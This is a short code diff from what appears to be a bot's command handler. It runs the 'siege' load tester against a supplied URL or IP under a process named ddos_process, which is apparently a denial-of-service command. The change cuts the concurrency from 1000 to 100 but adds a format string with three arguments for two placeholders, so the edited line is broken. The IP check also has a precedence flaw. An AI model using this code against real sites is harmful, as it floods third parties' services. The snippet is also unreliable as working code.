@@ -26,7 +26,7 @@ class BotCommands(object):
                 logging.debug("siege: %s" % self.ddos_process.communicate())
 
             if url is not None and validators.url(url):
-                cmdstr = "siege -c 1000 -t %ds %s "%(timeout, url)
+                cmdstr = "siege -c 100 -t %ds %s "%(timeout+2,timeout, url)
                 logging.debug(cmdstr)
                 ddos_process = subprocess.Popen(shlex.split(cmdstr))
             elif ip is not None and validators.ipv4(ip) or validators.ipv6(ip):
